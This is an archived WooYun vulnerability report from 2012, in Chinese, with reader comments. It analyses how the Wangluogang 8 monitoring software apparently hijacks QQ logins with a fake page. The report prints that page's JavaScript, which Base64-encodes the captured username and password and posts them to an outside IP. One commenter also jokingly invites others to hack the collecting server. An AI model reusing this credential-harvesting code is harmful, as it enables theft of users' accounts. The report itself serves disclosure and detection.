{"id": 20158, "wybug_id": "wooyun-2012-07248", "wybug_title": "网路岗8钓鱼式盗取QQ密码(分析过程)", "wybug_corp": "腾讯", "wybug_author": "New4", "wybug_date": "2012-05-17 16:44", "wybug_open_date": "2012-05-22 16:45", "wybug_type": "钓鱼欺诈信息", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["钓鱼欺诈", "用户敏感信息泄露", "漏洞分析技巧", "钓鱼风险", "内网嗅探", "客户端安全", "客户端密码窃取", "业务逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 网路岗软件会针对安装QQ的计算机进行攻击已经严重威胁用户隐私，首先会针对QQ登陆过程进行拦截导致QQ提示“账户异常”，随后劫持http://im.qq.com/jh网站尝试盗取QQ用户密码！成功后利用QQ密码对QQ用户进行聊天记录监控！！！ 详细说明：  网路岗软件会针对安装QQ的计算机进行攻击已经严重威胁用户隐私，首先会针对QQ登陆过程进行拦截导致QQ提示“账户异常”，随后劫持http://im.qq.com/jh网站尝试盗取QQ用户密码！成功后利用QQ密码对QQ用户进行聊天记录监控！！！劫持后的页面密码使用BASE64加密可被嗅探并解密还原：\n<script language=\"javascript\">var BASE64={    enKey: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',    deKey: new Array(        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,        -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,        -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1    ),        encode: function(src){        var str=new Array();        var ch1, ch2, ch3;        var pos=0;        while(pos+3<=src.length){            ch1=src.charCodeAt(pos++);            ch2=src.charCodeAt(pos++);            ch3=src.charCodeAt(pos++);            str.push(this.enKey.charAt(ch1>>2), this.enKey.charAt(((ch1<<4)+(ch2>>4))&0x3f));            str.push(this.enKey.charAt(((ch2<<2)+(ch3>>6))&0x3f), this.enKey.charAt(ch3&0x3f));        }        if(pos<src.length){            ch1=src.charCodeAt(pos++);            str.push(this.enKey.charAt(ch1>>2));            if(pos<src.length){                ch2=src.charCodeAt(pos);                str.push(this.enKey.charAt(((ch1<<4)+(ch2>>4))&0x3f));                str.push(this.enKey.charAt(ch2<<2&0x3f), '=');            }else{                str.push(this.enKey.charAt(ch1<<4&0x3f), '==');            }        }        return str.join('');    }};function paswdfield_eventchange(a, b){\tvar nonefm = window.document.ld;\tnonefm.u.value = BASE64.encode(a.u.value);\tnonefm.p.value = BASE64.encode(a.p.value);\tnonefm.w.value = \"518000\";\tnonefm.action  = \"http://211.157.108.252/s?flag=WWWSOFTBARCOMWWWSOFTBARCOM\";\tnonefm.target=\"nonewin\";\tnonefm.submit();}</script>\n   漏洞证明：  劫持QQ客户端\n\n被钓鱼后密码提交包\n\n钓鱼页面包含“<!-- saved from url=(0077)http://aq.qq.com/cn/services/abnormal/abnormal_index -->” 信息可直接判断是否被替换。   修复方案：  QQ客户端升级修改关键算法防止数据包传输过程中被非法篡改。由于网路岗使用QQ协议进行攻击，我想涉及的版本应该包含2010-2012 请腾讯公司尽快升级确保用户的安全。   版权声明：转载请注明来源 New4@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-05-22 16:45 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-17 16:45 |    \t\tNew4 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:16        | 暗安全技术小组 New4)\t\t \n  211.157.108.252 这个IP是网路岗的，还会收集用户密码 悲剧了！ 请尝试过的用户改密码吧 要不6位都不保    \n     2012-05-17 16:48 |    \t\tLinuxPad \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:1        | LinuxPad@AdLab.Venus)\t\t \n  老4  先给我看看  哈哈    \n     2012-05-17 17:06 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  帮顶一些。    \n     2012-05-17 17:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @New4 尼玛，还会发到网络上？    \n     2012-05-17 17:15 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @New4 应该不会收集密码吧？从网上破解来看似乎是个license check？    \n     2012-05-17 17:16 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @New4 应该不会收集密码吧？从网上破解这个软件的教程和问答来看，似乎是个license check？    \n     2012-05-17 17:19 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  @New4 不会真是暗组大哥的真身吧。。。    \n     2012-05-17 17:22 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  坐等公开。    \n     2012-05-17 17:32 |    \t\tNew4 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:16        | 暗安全技术小组 New4)\t\t \n  @xsser 我感觉应该是收集了密码 然后重定向到正常网站的。 后门服务器 谁日一下 看看受灾用户有多少……    \n     2012-05-17 17:38 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  @New4 先将密码收集，同时重定向到正常网站，如果post请求失败，在收集的密码后面自动添加失败注释。    \n     2012-05-17 17:39 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  由“网路岗可截获QQ密码和聊天记录”谈起http://www.freebuf.com/articles/1698.html    \n     2012-05-17 17:46 |    \t\tLinuxPad \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:1        | LinuxPad@AdLab.Venus)\t\t \n  @z@cx 你猜对了    \n     2012-05-17 17:54 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  @LinuxPad 膜拜了。。。    \n     2012-05-17 18:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  洞主是什么环境和版本    \n     2012-05-17 18:24 |    \t\tNew4 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:16        | 暗安全技术小组 New4)\t\t \n  @xsser 网路岗8最新 QQ2012最新（2010-2012应该通用） IE8.0（XP）    \n     2012-05-17 18:47 |    \t\tPentos \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:8        | 来潜水学习的！^^)\t\t \n  mark下    \n     2012-05-17 21:32 |    \t\ttpu01yzx \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:8        | test)\t\t \n  看了一下，其实只要把http变成https就可以了。    \n     2012-05-18 15:27 |    \t\tdavie \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:4        | 关注安全)\t\t \n  下载个鉴定下去！    \n     2012-05-20 16:57 |    \t\ttangzaifei \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | tangzaifei)\t\t \n  有传说网路岗和深信服的上网行为都已经能破解QQ聊天内容，具体实现方式还待确认。是报文加密内容被破解，还是报文劫持？ 找个网路岗试试去。    \n     2012-05-21 10:33 |    \t\tpopok \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:24        | nothing)\t\t \n  为了实现聊天记录监控，都用这种下三滥的方法骗KEY了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}